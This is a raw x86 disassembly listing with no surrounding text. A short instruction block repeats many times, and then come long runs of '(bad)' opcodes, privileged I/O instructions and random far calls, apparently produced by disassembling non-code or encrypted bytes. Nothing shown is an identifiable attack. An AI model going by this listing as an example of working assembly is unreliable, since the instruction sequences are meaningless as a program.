  42334e:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423355:	pop    esi
  423356:	rol    BYTE PTR [ecx],0x81
  423359:	loop   0x423367
  42335b:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423362:	pop    esi
  423363:	rol    BYTE PTR [ecx],0x81
  423366:	loop   0x423374
  423368:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  42336f:	pop    esi
  423370:	rol    BYTE PTR [ecx],0x81
  423373:	loop   0x423381
  423375:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  42337c:	pop    esi
  42337d:	rol    BYTE PTR [ecx],0x81
  423380:	loop   0x42338e
  423382:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423389:	pop    esi
  42338a:	rol    BYTE PTR [ecx],0x81
  42338d:	loop   0x42339b
  42338f:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423396:	pop    esi
  423397:	rol    BYTE PTR [ecx],0x81
  42339a:	loop   0x4233a8
  42339c:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4233a3:	pop    esi
  4233a4:	rol    BYTE PTR [ecx],0x81
  4233a7:	loop   0x4233b5
  4233a9:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4233b0:	pop    esi
  4233b1:	rol    BYTE PTR [ecx],0x81
  4233b4:	loop   0x4233c2
  4233b6:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4233bd:	pop    esi
  4233be:	rol    BYTE PTR [ecx],0x81
  4233c1:	loop   0x4233cf
  4233c3:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4233ca:	pop    esi
  4233cb:	rol    BYTE PTR [ecx],0x81
  4233ce:	loop   0x4233dc
  4233d0:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4233d7:	pop    esi
  4233d8:	rol    BYTE PTR [ecx],0x81
  4233db:	loop   0x4233e9
  4233dd:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4233e4:	pop    esi
  4233e5:	rol    BYTE PTR [ecx],0x81
  4233e8:	loop   0x4233f6
  4233ea:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4233f1:	pop    esi
  4233f2:	rol    BYTE PTR [ecx],0x81
  4233f5:	loop   0x423403
  4233f7:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4233fe:	pop    esi
  4233ff:	rol    BYTE PTR [ecx],0x81
  423402:	loop   0x423410
  423404:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  42340b:	pop    esi
  42340c:	rol    BYTE PTR [ecx],0x81
  42340f:	loop   0x42341d
  423411:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423418:	pop    esi
  423419:	rol    BYTE PTR [ecx],0x81
  42341c:	loop   0x42342a
  42341e:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423425:	pop    esi
  423426:	rol    BYTE PTR [ecx],0x81
  423429:	loop   0x423437
  42342b:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423432:	pop    esi
  423433:	rol    BYTE PTR [ecx],0x81
  423436:	loop   0x423444
  423438:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  42343f:	pop    esi
  423440:	rol    BYTE PTR [ecx],0x81
  423443:	loop   0x423451
  423445:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  42344c:	pop    esi
  42344d:	rol    BYTE PTR [ecx],0x81
  423450:	loop   0x42345e
  423452:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423459:	pop    esi
  42345a:	rol    BYTE PTR [ecx],0x81
  42345d:	loop   0x42346b
  42345f:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423466:	pop    esi
  423467:	rol    BYTE PTR [ecx],0x81
  42346a:	loop   0x423478
  42346c:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423473:	pop    esi
  423474:	rol    BYTE PTR [ecx],0x81
  423477:	loop   0x423485
  423479:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423480:	pop    esi
  423481:	rol    BYTE PTR [ecx],0x81
  423484:	loop   0x423492
  423486:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  42348d:	pop    esi
  42348e:	rol    BYTE PTR [ecx],0x81
  423491:	loop   0x42349f
  423493:	xchg   BYTE PTR [eax+esi*2-0x7689e4b9],al
  42349a:	mov    al,0xca
  42349c:	add    DWORD PTR [esi-0x7b69f31e],ebp
  4234a2:	jo     0x423511
  4234a4:	mov    ecx,0x3f38bfac
  4234a9:	sub    al,0x1f
  4234ab:	gs pop esp
  4234ad:	imul   esi,DWORD PTR [edx-0x1c50ab68],0xffffffa8
  4234b4:	das    
  4234b5:	inc    esp
  4234b6:	pop    ebx
  4234b7:	xchg   edx,eax
  4234b8:	push   ebx
  4234b9:	mov    ebx,0xcd94e990
  4234be:	call   0xb83e:0x503ce0b0
  4234c5:	rol    DWORD PTR [ebx+0x37],1
  4234c8:	xchg   ebx,eax
  4234c9:	push   edx
  4234ca:	inc    edi
  4234cb:	cmp    al,0xd1
  4234cd:	inc    esi
  4234ce:	or     edx,DWORD PTR [ecx+0x31d0286c]
  4234d4:	pop    ebx
  4234d5:	nop
  4234d6:	shl    DWORD PTR [edi],0xb
  4234d9:	sub    eax,0x682f4fe8
  4234de:	and    BYTE PTR [esi-0x4857c315],cl
  4234e4:	retf   0x884f
  4234e7:	clc    
  4234e8:	cs or  eax,0xc5428398
  4234ee:	adc    BYTE PTR [ebx],0x9
  4234f1:	js     0x4234fa
  4234f3:	add    edx,ebx
  4234f5:	out    dx,eax
  4234f6:	outs   dx,BYTE PTR ds:[esi]
  4234f7:	(bad)  
  4234f8:	sbb    bh,BYTE PTR [edx]
  4234fa:	dec    ebx
  4234fb:	int3   
  4234fc:	mov    BYTE PTR [ecx],bh
  4234fe:	dec    edx
  4234ff:	ja     0x4234cd
  423501:	inc    esp
  423502:	push   ebx
  423503:	mov    bh,bh
  423505:	addr16 adc eax,0x26e18c31
  42350b:	icebp  
  42350c:	fsubr  st,st(0)
  42350e:	push   cs
  42350f:	ds push ss
  423511:	dec    edx
  423512:	ret    0xee06
  423515:	outs   dx,DWORD PTR ds:[esi]
  423516:	push   esp
  423517:	cmp    eax,esp
  423519:	ret    
  42351a:	pop    ebp
  42351b:	outs   dx,BYTE PTR ds:[esi]
  42351c:	pop    edx
  42351d:	sub    ecx,DWORD PTR [edx+0x51eea61f]
  423523:	not    BYTE PTR [ebx+0x40]
  423526:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  423528:	push   ds
  423529:	jg     0x4234d0
  42352b:	pop    ebx
  42352c:	leave  
  42352d:	fcomp  QWORD PTR [ebp+0x5]
  423530:	dec    eax
  423531:	xor    edx,DWORD PTR [ebx-0x7bd98b10]
  423537:	or     al,bl
  423539:	ror    edi,1
  42353b:	sub    cl,al
  42353d:	xor    cl,BYTE PTR [ebx+0x3a]
  423540:	push   DWORD PTR [ebp-0x606f248f]
  423546:	loop   0x423518
  423548:	daa    
  423549:	aaa    
  42354a:	jae    0x4234eb
  42354c:	mov    edx,0xd03d91e2
  423551:	or     ebx,DWORD PTR [ebx-0x17]
  423554:	iret   
  423555:	data16 cmp BYTE PTR [esi-0x2],0x0
  42355a:	popf   
  42355b:	out    dx,al
  42355c:	hlt    
  42355d:	shl    BYTE PTR [esi],0x8
  423560:	pop    es
  423561:	dec    ebx
  423562:	add    eax,0xe0d34a53
  423567:	retf   
  423568:	mov    ds:0xdbe2fbd0,al
  42356d:	pop    ecx
  42356e:	cmp    DWORD PTR [eax],esi
  423570:	mov    dl,0xb6
  423572:	pushf  
  423573:	and    al,0xab
  423575:	sbb    edi,ebx
  423577:	mov    esp,0x36d57add
  42357c:	pop    esi
  42357d:	pop    ss
  42357e:	test   eax,0xe1497ee0
  423583:	dec    edx
  423584:	xchg   ebp,eax
  423585:	adc    esp,DWORD PTR [edi-0x22d85aa6]
  42358b:	pop    ss
  42358c:	mov    ah,0xf5
  42358e:	jmp    0x7cc7b271
  423593:	add    bl,dl
  423595:	sbb    DWORD PTR [edi+0x3d],0x8409f182
  42359c:	out    dx,eax
  42359d:	lods   eax,DWORD PTR ds:[esi]
  42359e:	inc    eax
  42359f:	mov    ebp,0xa7c90e02
  4235a4:	dec    ecx
  4235a5:	shr    DWORD PTR [edx-0x7ecf828b],0xf9
  4235ac:	jmp    0x423544
  4235ae:	xchg   DWORD PTR [ecx*4-0x29a5e5af],edx
  4235b5:	mov    bl,BYTE PTR [edx-0x1c]
  4235b8:	push   cs
  4235b9:	test   DWORD PTR [edx],edi
  4235bb:	pop    ds
  4235bc:	or     eax,0x636a151b
  4235c1:	cli    
  4235c2:	(bad)  [edx+esi*1-0x58]
  4235c6:	pop    ebp
  4235c7:	gs push edx
  4235c9:	add    ch,bh
  4235cb:	loop   0x42356a
  4235cd:	leave  
  4235ce:	stos   BYTE PTR es:[edi],al
  4235cf:	loop   0x423604
  4235d1:	pushf  
  4235d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235d3:	stc    
  4235d4:	in     al,0x8b
  4235d6:	sbb    eax,0x5b4f020
  4235db:	lods   eax,DWORD PTR ds:[esi]
  4235dc:	cli    
  4235dd:	das    
  4235de:	cmp    ebp,DWORD PTR [eax-0x5d7928fd]
  4235e4:	pop    esi
  4235e5:	das    
  4235e6:	in     al,dx
  4235e7:	or     BYTE PTR [ecx+0x17],0x4a
  4235eb:	fistp  DWORD PTR [ebx]
  4235ed:	ins    DWORD PTR es:[edi],dx
  4235ee:	out    dx,al
  4235ef:	inc    ebp
  4235f0:	ja     0x4235cc
  4235f2:	int    0x77
  4235f4:	lea    edi,[ecx]
  4235f6:	mov    ebp,0xe9a97087
  4235fb:	mov    bl,0x40
  4235fd:	xchg   BYTE PTR [edx+0x7181276b],bl
  423603:	(bad)  
  423604:	xchg   esi,eax
  423605:	jbe    0x423613
  423607:	dec    eax
  423608:	outs   dx,BYTE PTR ds:[esi]
  423609:	xor    bh,BYTE PTR [ecx-0x20]
  42360c:	lea    esi,[esi]
  42360e:	das    
  42360f:	dec    edx
  423610:	xchg   DWORD PTR [ebp+0x3f],esp
  423613:	retf   
  423614:	pop    edi
  423615:	mov    edx,0xa6cd1367
  42361a:	cli    
  42361b:	inc    esp
  42361c:	pop    eax
  42361d:	inc    ebp
  42361e:	in     al,dx
  42361f:	repnz push esp
  423621:	mov    ds:0x4648602d,eax
  423626:	loop   0x4235e1
  423628:	add    ebx,DWORD PTR [eax-0x1a]
  42362b:	in     al,0x14
  42362d:	adc    ebx,DWORD PTR [edx]
  42362f:	jg     0x4235d9
  423631:	es pop esi
  423633:	adc    bh,BYTE PTR [ebx]
  423635:	test   eax,0x3ebf9c20
  42363a:	cmp    BYTE PTR [edi-0x8],dh
  42363d:	pushf  
  42363e:	add    ebp,ecx
  423640:	cmp    edx,DWORD PTR [ebx]
  423642:	cmp    BYTE PTR [ebx],bh
  423644:	mov    bl,0x40
  423646:	dec    ebx
  423647:	mov    ecx,0xf136147a
  42364c:	bound  ebx,QWORD PTR [edi-0x2d]
  42364f:	cmc    
  423650:	out    dx,eax
  423651:	aam    0xd
  423653:	test   eax,0x5ef4c072
  423658:	dec    esp
  423659:	data16 lods al,BYTE PTR ds:[esi]
  42365b:	xchg   BYTE PTR ss:[eax-0x1f135016],ch
  423662:	mov    al,0xa7
  423664:	jne    0x4236b7
  423666:	stos   DWORD PTR es:[edi],eax
  423667:	dec    eax
  423668:	sub    dl,BYTE PTR [ebx+ecx*4+0x30]
  42366c:	std    
  42366d:	sar    BYTE PTR [edx+0x605c89da],cl
  423673:	xor    DWORD PTR [ebx+esi*2+0x6912e239],esi
  42367a:	jbe    0x42363b
  42367c:	fidivr WORD PTR [edi+0x74]
  42367f:	mov    esi,0xd90c72be
  423684:	dec    ecx
  423685:	cmpxchg DWORD PTR [esi],ebp
  423688:	or     bh,BYTE PTR [eax]
  42368a:	add    bh,BYTE PTR [ebx+0x13fe07ff]
  423690:	pop    ds
  423691:	dec    eax
  423692:	pop    edi
  423693:	cmp    BYTE PTR [eax+0x7689ac4b],ch
  423699:	rol    BYTE PTR [edx+ebx*2],0xd9
  42369d:	inc    ebx
  42369e:	mov    esi,0x42721a8d
  4236a3:	add    BYTE PTR [esi],dl
  4236a5:	mov    edx,0x6f2ed8f9
  4236aa:	not    edx
  4236ac:	pop    ebp
  4236ad:	add    esp,DWORD PTR [edi-0x6062fc05]
  4236b3:	iret   
  4236b4:	repz dec ecx
  4236b6:	addr16 pop ecx
  4236b8:	cwde   
  4236b9:	mov    edx,0x11e5a499
  4236be:	stc    
  4236bf:	push   eax
  4236c0:	hlt    
  4236c1:	(bad)  
  4236c2:	bound  ecx,QWORD PTR [edi-0x7f]
  4236c5:	out    0x0,eax
  4236c7:	bound  esp,QWORD PTR [edx-0x34a876dd]
  4236cd:	out    0xbb,eax
  4236cf:	cmp    al,0xe9
  4236d1:	aaa    
  4236d2:	mov    esi,0x97c1295d
  4236d7:	pop    edx
  4236d8:	pop    es
  4236d9:	nop
  4236da:	popf   
  4236db:	pusha  
  4236dc:	and    ch,al
  4236de:	mov    eax,0x7dc47c5
  4236e3:	inc    ebp
  4236e4:	je     0x42372b
  4236e6:	rcl    BYTE PTR [ebx+0x42],cl
  4236e9:	ins    DWORD PTR es:[edi],dx
  4236ea:	pop    esi
  4236eb:	pop    ss
  4236ec:	mov    cl,BYTE PTR ds:0xc3d8137b
  4236f2:	lea    edi,[esp+ecx*4+0x5e]
  4236f6:	dec    edi
  4236f7:	stos   DWORD PTR es:[edi],eax
  4236f8:	push   ecx
  4236f9:	cmp    ah,BYTE PTR [esi]
  4236fb:	adc    edi,DWORD PTR [edi-0x43]
  4236fe:	mov    ch,0xfc
  423700:	pop    edi
  423701:	pop    edx
  423702:	pushf  
  423703:	sbb    dl,BYTE PTR [esi]
  423705:	lods   eax,DWORD PTR ds:[esi]
  423706:	cli    
  423707:	adc    cl,BYTE PTR [edx-0xd]
  42370a:	pushf  
  42370b:	imul   esp,eax,0x45671c5c
  423711:	rol    DWORD PTR [ebp-0x1b10d8ba],1
  423717:	data16 scas al,BYTE PTR es:[edi]
  423719:	out    0xf1,al
  42371b:	jno    0x423704
  42371d:	gs xchg esp,eax
  42371f:	dec    esp
  423720:	xor    BYTE PTR [esi],0x9c
  423723:	mov    ch,0xb6
  423725:	int    0x99
  423727:	test   BYTE PTR [edx+0x5b88d295],0x5
  42372e:	lea    ecx,[ebx-0x19]
  423731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423732:	cmp    edx,DWORD PTR [eax+esi*4-0xa5c2e4a]
  423739:	in     eax,0x56
  42373b:	mov    esi,0xd8b0084f
  423740:	scas   al,BYTE PTR es:[edi]
  423741:	inc    edi
  423742:	ds xchg ebp,eax
  423744:	or     BYTE PTR [eax-0x76],ah
  423747:	ret    
  423748:	int3   
  423749:	ins    DWORD PTR es:[edi],dx
  42374a:	cli    
  42374b:	dec    edx
  42374c:	mov    ds:0xa05c7aa5,eax
  423751:	xchg   esi,eax
  423752:	adc    eax,0xfe94cb
  423757:	xlat   BYTE PTR ds:[ebx]
  423758:	mov    ebp,0xc98aec51
  42375d:	test   BYTE PTR [eax],dh
  42375f:	jno    0x4236e3
  423761:	and    BYTE PTR [ecx-0x64],bh
  423764:	scas   al,BYTE PTR es:[edi]
  423765:	ins    BYTE PTR es:[edi],dx
  423766:	pop    ss
  423767:	call   0xdbcc:0x4a26063d
  42376e:	int3   
  42376f:	cmp    al,0x74
  423771:	jb     0x42378e
  423773:	dec    ebp
  423774:	push   edx
  423775:	push   es
  423776:	dec    ecx
  423777:	dec    esp
  423778:	popf   
  423779:	xchg   DWORD PTR es:[eax-0x6c],ecx
  42377d:	sbb    edx,edx
  42377f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423780:	arpl   cx,di
  423782:	in     al,dx
  423783:	scas   al,BYTE PTR es:[edi]
  423784:	stc    
  423785:	jbe    0x42375f
  423787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423788:	mov    edi,DWORD PTR [esi+edi*8+0x3d0c1920]
  42378f:	push   esp
  423790:	test   eax,0x2ad71722
  423795:	push   edx
  423796:	inc    edx
  423797:	pop    esp
  423798:	cmp    eax,0x337a4bfe
  42379d:	in     eax,0x76
  42379f:	sub    BYTE PTR ds:0x2f94c106,ch
  4237a5:	inc    ecx
  4237a6:	xor    al,0xf9
  4237a8:	or     al,0x0
  4237aa:	aas    
  4237ab:	push   cs
  4237ac:	xchg   esi,eax
  4237ad:	xchg   edx,eax
  4237ae:	mov    esp,0x971ffbc7
  4237b3:	std    
  4237b4:	pushf  
  4237b5:	cmp    edx,0xffffffcc
  4237b8:	pop    ebx
  4237b9:	imul   ebp,DWORD PTR [ebp+0x368c09c7],0x463ae7b6
  4237c3:	xchg   ebp,eax
  4237c4:	loop   0x423826
  4237c6:	add    eax,0xa5ef8388
  4237cb:	sub    ah,al
  4237cd:	js     0x423809
  4237cf:	cdq    
  4237d0:	retf   0xb07a
  4237d3:	lahf   
  4237d4:	jb     0x423768
  4237d6:	inc    ecx
  4237d7:	cmp    edx,ebx
  4237d9:	push   esi
  4237da:	scas   al,BYTE PTR es:[edi]
  4237db:	jnp    0x4237e4
  4237dd:	sub    DWORD PTR [ebp-0x6],ebp
  4237e0:	fisub  WORD PTR [edx+0x582a5497]
  4237e6:	add    DWORD PTR [ebp+esi*4+0x5f234221],edi
  4237ed:	daa    
  4237ee:	mov    bl,0x69
  4237f0:	pop    edi
  4237f1:	ror    BYTE PTR [ebp-0x35afb2ca],0xd4
  4237f8:	scas   eax,DWORD PTR es:[edi]
  4237f9:	adc    dl,BYTE PTR [ecx]
  4237fb:	cdq    
  4237fc:	mov    edi,0x20fa54c0
  423801:	jne    0x42381e
  423803:	xchg   ebx,eax
  423804:	pusha  
  423805:	repz sbb dh,BYTE PTR [ecx]
  423808:	lods   al,BYTE PTR ds:[esi]
  423809:	gs cdq 
  42380b:	mov    eax,ds:0x652e45c8
  423810:	fmul   st(7),st
  423812:	mov    ds:0xbb069e3a,eax
  423817:	hlt    
  423818:	addr16 xchg ebx,eax
  42381a:	push   0x3f
  42381c:	cmp    BYTE PTR [eax+0x2d],ah
  42381f:	rol    BYTE PTR [ebp+0x5b],0x42
  423823:	sub    eax,0x8e53c274
  423828:	mov    ch,0x52
  42382a:	pop    esp
  42382b:	inc    ecx
  42382c:	push   esp
  42382d:	shr    BYTE PTR [ebx+ebp*4+0x76],cl
  423831:	or     eax,0xf211417
  423836:	inc    eax
  423837:	push   ss
  423838:	(bad)  
  423839:	bound  esp,QWORD PTR [edx+0x7a]
  42383c:	sar    DWORD PTR [ebx-0x51],cl
  42383f:	sbb    edx,DWORD PTR [ebx+0x313a106b]
  423845:	xor    BYTE PTR [eax+eax*2],0x40
  423849:	arpl   WORD PTR [ecx-0xa7653ce],bp
  42384f:	pop    esp
  423850:	call   0x8f77:0x53cbc853
  423857:	sub    ebp,esp
  423859:	pushf  
  42385a:	push   ebp
  42385b:	pop    edx
  42385c:	dec    esi
  42385d:	loopne 0x42382b
  42385f:	jnp    0x423890
  423861:	inc    ecx
  423862:	mov    esp,edx
  423864:	call   0x35de0b3f
  423869:	stos   BYTE PTR es:[edi],al
  42386a:	xchg   edx,eax
  42386b:	hlt    
  42386c:	mov    ecx,0x7b4d1f7f
  423871:	push   eax
  423872:	repz rcr ch,cl
  423875:	push   es
  423876:	or     dh,dl
  423878:	dec    ecx
  423879:	mov    DWORD PTR [edx+eax*2+0x2a],eax
  42387d:	push   esp
  42387e:	add    ecx,DWORD PTR ds:0x7b28b57
  423884:	sbb    esi,esp
  423886:	mov    bl,0x98
  423888:	adc    bl,BYTE PTR [edi-0x56]
  42388b:	es stos DWORD PTR es:[edi],eax
  42388d:	pmaxsw mm0,QWORD PTR [esi]
  423890:	cs cmc 
  423892:	loop   0x423912
  423894:	cdq    
  423895:	repnz enter 0x19bd,0x2
  42389a:	push   esi
  42389b:	(bad)  
  42389c:	fidivr DWORD PTR [edx-0x2f620829]
  4238a2:	test   al,0x19
  4238a4:	daa    
  4238a5:	fld    QWORD PTR [edx]
  4238a7:	nop
  4238a8:	jno    0x4238a5
  4238aa:	xchg   ebx,eax
  4238ab:	push   ds
  4238ac:	imul   DWORD PTR [edx]
  4238ae:	in     eax,dx
  4238af:	cmp    bh,BYTE PTR [ebx+edx*1-0xb]
  4238b3:	loope  0x423891
  4238b5:	inc    ebp
  4238b7:	iret   
  4238b8:	rcl    DWORD PTR [ecx-0x2b],1
  4238bb:	(bad)  
  4238bc:	(bad)
  4238c1:	lea    ebx,[edi+0x30356020]
  4238c7:	lea    ebx,[esi+0x75]
  4238ca:	mov    edx,0x17a111f9
  4238cf:	hlt    
  4238d0:	leave  
  4238d1:	add    edi,eax
  4238d3:	std    
  4238d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238d5:	sbb    al,0x4f
  4238d7:	(bad)  ds:0x847924e8
  4238dd:	in     eax,0x45
  4238df:	push   ebp
  4238e0:	and    eax,DWORD PTR [ebx-0x33]
  4238e3:	dec    ebx
  4238e4:	sti    
  4238e5:	loopne 0x42393c
  4238e7:	fsubr  DWORD PTR [ecx+0xe043acf]
  4238ed:	sub    BYTE PTR [esi+0x3485496a],al
  4238f3:	int3   
  4238f4:	mov    ds:0xa53b97d0,eax
  4238f9:	aaa    
  4238fa:	ror    DWORD PTR [edx+0x3a34ab65],1
  423900:	mov    eax,ds:0x74d24091
  423905:	test   al,0xdf
  423907:	cmp    DWORD PTR [edx+ebp*1+0x623f5e7a],0xffffff85
  42390f:	sbb    DWORD PTR [esi-0x6a],esi
  423912:	fiadd  WORD PTR [esi+0x16]
  423915:	and    BYTE PTR [ebx+0x57],cl
  423918:	test   eax,0xb17837fd
  42391d:	ins    DWORD PTR es:[edi],dx
  42391e:	adc    BYTE PTR [ebx],dh
  423920:	sbb    eax,0xb1ca4a36
  423925:	std    
  423926:	sbb    dl,0x75
  423929:	ja     0x423914
  42392b:	fimul  DWORD PTR [esi+0x4d]
  42392e:	mov    DWORD PTR [edi-0x2cc6eed8],edx
  423934:	jno    0x42399c
  423936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423937:	push   esi
  423938:	push   eax
  423939:	std    
  42393a:	test   eax,eax
  42393c:	fld    DWORD PTR ss:[eax+0x1c7c1bf2]
  423943:	and    eax,0x769e920a
  423948:	xchg   BYTE PTR [edx-0x53],dl
  42394b:	mov    DWORD PTR [edx-0x25743032],edi
  423951:	ret    0xdc0d
  423954:	inc    esp
  423955:	jae    0x423925
  423957:	pop    es
  423958:	cmp    al,0x85
  42395a:	xor    bh,BYTE PTR [ebx+esi*1]
  42395d:	xchg   DWORD PTR [eax+eiz*8],ecx
  423960:	sub    ebp,DWORD PTR [esi+0x34]
  423963:	shr    DWORD PTR [edx+0x5c92ca12],0x1e
  42396a:	xchg   esp,eax
  42396b:	test   esi,ebx
  42396d:	out    dx,eax
  42396e:	out    0xb1,eax
  423970:	mul    BYTE PTR [ecx-0x49]
  423973:	pop    ds
  423974:	(bad)  
  423975:	lods   eax,DWORD PTR ds:[si]
  423977:	shl    dl,0x4
  42397a:	xchg   BYTE PTR [edx+0x6a],bl
  42397d:	add    al,0xf7
  42397f:	out    dx,al
  423980:	mov    edi,0x91250af0
  423985:	fcmovu st,st(7)
  423987:	enter  0xf03e,0x4d
  42398b:	test   eax,0xa367d360
  423990:	push   cs
  423991:	cdq    
  423992:	and    eax,DWORD PTR [ebx]
  423994:	test   DWORD PTR ds:0x7267068f,0x3fcb6490
  42399e:	adc    BYTE PTR [edi],al
  4239a0:	test   cl,ch
  4239a2:	arpl   WORD PTR [ebx+ebx*1],si
  4239a5:	out    0x3e,eax
  4239a7:	jns    0x4239b7
  4239a9:	sub    BYTE PTR [ebx],dl
  4239ab:	jo     0x4239b9
  4239ad:	sub    eax,0x11ebfb57
  4239b2:	inc    edi
  4239b3:	(bad)  
  4239b5:	and    eax,0x3bb3c63e
  4239ba:	pusha  
  4239bb:	and    al,0x8e
  4239bd:	mov    esp,0xee23e261
  4239c2:	mov    cs,eax
  4239c4:	outs   dx,BYTE PTR ds:[esi]
  4239c5:	pushf  
  4239c6:	xor    al,0x6
  4239c8:	sbb    BYTE PTR [ecx+eax*8],dh
  4239cb:	pop    ds
  4239cc:	ds (bad) 
  4239ce:	in     al,0x1f
  4239d0:	mov    ecx,0x6eafbf7d
  4239d5:	and    al,0xbb
  4239d7:	xlat   BYTE PTR ds:[ebx]
  4239d8:	arpl   WORD PTR [ebp+0x7f],cx
  4239db:	push   ebp
  4239dc:	in     al,dx
  4239dd:	aas    
  4239de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239df:	mov    esi,esp
  4239e1:	pop    eax
  4239e2:	js     0x423973
  4239e4:	dec    esi
  4239e5:	adc    DWORD PTR [edx-0x57],edx
  4239e8:	sub    DWORD PTR [ecx+eax*8],edi
  4239eb:	jne    0x4239b0
  4239ed:	inc    esi
  4239ee:	fcom   DWORD PTR [esi-0x535cda74]
  4239f4:	add    edi,DWORD PTR es:[edi]
  4239f7:	not    DWORD PTR [ecx+0xe]
  4239fa:	mov    ch,0x14
  4239fc:	mov    eax,ds:0x513d8e75
  423a01:	pop    edx
  423a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a03:	push   0x74b667e8
  423a08:	gs pop edx
  423a0a:	and    bl,cl
  423a0c:	std    
  423a0d:	pop    es
  423a0e:	pop    ss
  423a0f:	or     eax,0x7665c041
  423a14:	mov    eax,DWORD PTR ds:0x72496ed3
  423a1a:	in     eax,0x8f
  423a1c:	push   es
  423a1d:	das    
  423a1e:	dec    DWORD PTR [ebp-0x50e01069]
  423a24:	hlt    
  423a25:	ss inc edx
  423a27:	inc    eax
  423a28:	ins    BYTE PTR es:[edi],dx
  423a29:	cmp    al,0x43
  423a2b:	or     al,0x8d
  423a2d:	lahf   
  423a2e:	addr16 loop 0x4239d3
  423a31:	repz fwait
  423a33:	imul   edx,eax,0x52
  423a36:	aaa    
  423a37:	pushf  
  423a38:	clc    
  423a39:	push   ebp
  423a3a:	loopne 0x423a06
  423a3c:	cli    
  423a3d:	adc    bh,BYTE PTR [ebx+0xfd867ae]
  423a43:	loopne 0x423a2f
  423a45:	push   ebp
  423a46:	inc    esi
  423a47:	adc    al,0x41
  423a49:	sbb    bl,BYTE PTR [edi-0x11]
  423a4c:	xchg   DWORD PTR [edx+0xc],ebp
  423a4f:	gs sahf 
  423a51:	seto   BYTE PTR [ecx-0x1]
  423a55:	sbb    esp,ebp
  423a57:	pushf  
  423a58:	(bad)  
  423a59:	sbb    eax,0x62148d0a
  423a5e:	es xchg ebx,eax
  423a60:	std    
  423a61:	cmp    eax,0x82004db9
  423a66:	add    eax,DWORD PTR [esi]
  423a68:	rcr    BYTE PTR [eax+0x65daf19a],0x89
  423a6f:	stos   BYTE PTR es:[edi],al
  423a70:	test   eax,0x398df55d
  423a75:	push   edi
  423a76:	xor    ecx,DWORD PTR [edx]
  423a78:	popf   
  423a79:	add    BYTE PTR [edi-0x3d4179f5],dh
  423a7f:	add    edi,DWORD PTR [edx-0x3c]
  423a82:	retf   
  423a83:	(bad)  
  423a84:	mov    eax,0x3597c1dc
  423a89:	sub    BYTE PTR [edi+0x2f000974],bh
  423a8f:	inc    edi
  423a90:	cmp    eax,0x9b34449
  423a95:	mov    ds:0xec2a1500,eax
  423a9a:	repnz cmp bl,bh
  423a9d:	out    dx,eax
  423a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a9f:	les    eax,FWORD PTR [esi]
  423aa1:	(bad)  
  423aa2:	aad    0x5c
  423aa4:	fs lock imul ebx,esp,0x5b
  423aa9:	add    BYTE PTR [ebx-0x390829c8],dl
  423aaf:	sub    BYTE PTR [eax-0x3],dh
  423ab2:	inc    ecx
  423ab3:	or     ebx,DWORD PTR ds:0x8572b8ee
  423ab9:	xchg   DWORD PTR es:[edx-0x5bf7f689],esi
  423ac0:	je     0x423af9
  423ac2:	retf   
  423ac3:	push   esp
  423ac4:	pop    ds
  423ac5:	sub    ah,al
  423ac7:	ss inc ebx
  423ac9:	jle    0x423a4c
  423acb:	cmp    DWORD PTR [ecx+0x3881c40d],ebp
  423ad1:	xlat   BYTE PTR ds:[ebx]
  423ad2:	dec    ebx
  423ad3:	iret   
  423ad4:	xor    al,0xb2
  423ad6:	add    eax,ebp
  423ad8:	outs   dx,BYTE PTR ds:[esi]
  423ad9:	push   ebx
  423ada:	loopne 0x423b45
  423adc:	lahf   
  423add:	mov    ecx,ds
  423adf:	cmc    
  423ae0:	clc    
  423ae1:	inc    ebx
  423ae2:	mov    bh,al
  423ae4:	into   
  423ae5:	arpl   WORD PTR [edi+0x23f026bd],bx
  423aeb:	ret    
  423aec:	aas    
  423aed:	dec    edi
  423aee:	xchg   DWORD PTR [esp+eax*1],edx
  423af1:	nop
  423af2:	pop    esi
  423af3:	loop   0x423afc
  423af5:	mov    esp,DWORD PTR [esi]
  423af7:	nop
  423af8:	stc    
  423af9:	cmp    DWORD PTR [eax+0x391167a4],ebx
  423aff:	push   eax
  423b00:	in     al,0xa1
  423b02:	and    bh,ah
  423b04:	jae    0x423b34
  423b06:	test   al,0x3f
  423b08:	aaa    
  423b09:	jns    0x423b53
  423b0b:	and    bh,BYTE PTR [ebx+0x14]
  423b0e:	mov    cl,0x7
  423b10:	xlat   BYTE PTR ds:[ebx]
  423b11:	iret   
